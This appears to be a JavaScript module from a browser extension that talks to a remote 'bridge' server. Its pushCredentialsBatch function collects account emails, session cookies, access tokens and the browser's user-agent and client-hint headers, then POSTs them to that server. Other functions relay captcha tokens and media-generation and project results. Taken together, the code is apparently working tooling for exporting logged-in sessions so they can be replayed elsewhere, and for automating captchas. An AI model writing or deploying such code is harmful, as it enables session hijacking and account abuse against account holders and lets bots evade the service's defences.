import { logActivity } from '../background/runtime/log.js';
import { runtime } from '../background/runtime/state.js';
import { bridgeRequest, authHeaders } from './client.js';

export async function pushCredentialsBatch(accounts) {
  try {
    const uaData = navigator.userAgentData;
    const secChUa = uaData?.brands
      ? uaData.brands.map((b) => `"${b.brand}";v="${b.version}"`).join(', ') : '';
    const platform = uaData?.platform ? `"${uaData.platform}"` : '"Windows"';
    const mobile = uaData?.mobile ? '?1' : '?0';

    const payload = {
      ext_fp: runtime.extFp,
      credentials: (accounts || []).map((a) => ({
        email: a.email,
        cookie: a.cookie,
        access_token: a.access_token,
        expiry: a.expiry,
        tier: a.tier,
        credit: a.credit,
        tab_id: a.tabId,
        incognito: a.incognito,
        user_agent: navigator.userAgent,
        sec_ch_ua: secChUa,
        sec_ch_ua_platform: platform,
        sec_ch_ua_mobile: mobile,
      })),
    };

    const resp = await bridgeRequest('credentials', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(8_000),
    });
    if (resp.ok) {
      logActivity('info', `Pushed ${payload.credentials.length} credential(s)`);
      return true;
    }
    logActivity('warn', `Push batch failed: HTTP ${resp.status}`);
  } catch (e) {
    logActivity('warn', `pushCredentialsBatch: ${e.message}`);
  }
  return false;
}

export async function postCaptchaResponse(requestId, token, error) {
  try {
    await bridgeRequest('captchaResult', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        token,
        error: error || null,
        user_agent: navigator.userAgent,
      }),
      signal: AbortSignal.timeout(8_000),
    });
  } catch (e) {
    logActivity('warn', `postCaptchaResponse: ${e.message}`);
  }
}

export async function postImageResponse(requestId, result) {
  try {
    await bridgeRequest('imageResult', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        result: result?.ok ? result : null,
        error: result?.ok ? null : (result?.error || 'Unknown Image error'),
        logs: runtime.activityLog.slice(-10),
      }),
      signal: AbortSignal.timeout(10_000),
    });
  } catch (error) {
    logActivity('warn', `postImageResponse: ${error.message}`);
  }
}

export async function postVideoUploadResponse(requestId, result) {
  try {
    await bridgeRequest('uploadResult', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        ok: result?.ok || false,
        media_id: result?.media_id || null,
        project_id: result?.project_id || null,
        error: result?.ok ? null : (result?.error || 'Unknown video upload error'),
        logs: runtime.activityLog.slice(-5),
      }),
      signal: AbortSignal.timeout(10_000),
    });
  } catch (err) {
    logActivity('warn', `postVideoUploadResponse: ${err.message}`);
  }
}

export async function postFlowResponse(requestId, result) {
  try {
    await bridgeRequest('flowResult', {
      method: 'POST', headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        result: result?.ok ? result : null,
        error: result?.ok ? null : (result?.error || 'Unknown Flow error'),
      }),
      signal: AbortSignal.timeout(8_000),
    });
  } catch (error) {
    logActivity('warn', `postFlowResponse: ${error.message}`);
  }
}

export async function postProjectCreatedResponse(requestId, result) {
  try {
    await bridgeRequest('projectCreated', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        ok: result?.ok || false,
        flow_project_id: result?.flow_project_id || '',
        account_email: result?.account_email || '',
        error: result?.ok ? null : (result?.error || 'Lỗi không xác định'),
      }),
      signal: AbortSignal.timeout(8_000),
    });
  } catch (err) {
    logActivity('warn', `postProjectCreatedResponse: ${err.message}`);
  }
}

export async function postProjectSwitchedResponse(requestId, result) {
  try {
    await bridgeRequest('projectSwitched', {
      method: 'POST',
      headers: authHeaders(),
      body: JSON.stringify({
        request_id: requestId,
        ok: result?.ok || false,
        flow_project_id: result?.flow_project_id || '',
        tab_id: result?.tab_id || null,
        error: result?.ok ? null : (result?.error || 'Lỗi không xác định'),
      }),
      signal: AbortSignal.timeout(8_000),
    });
  } catch (err) {
    logActivity('warn', `postProjectSwitchedResponse: ${err.message}`);
  }
}
